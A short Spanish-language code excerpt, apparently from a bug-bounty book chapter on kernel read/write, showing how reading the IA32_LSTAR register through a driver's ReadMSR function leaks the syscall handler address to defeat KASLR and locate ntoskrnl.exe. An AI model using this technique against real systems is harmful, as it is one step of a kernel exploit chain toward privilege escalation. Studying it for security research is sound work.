# Extraído de: LibroBugBounty/cap-11-kernel-rw.md
# Leer IA32_LSTAR — dirección del handler de syscall
# Derrota KASLR: revela el base address de ntoskrnl.exe
lstar = asio.ASIO_ReadMSR(0xC0000082)
# ntoskrnl base = lstar - offset_conocido_de_KiSystemCall64
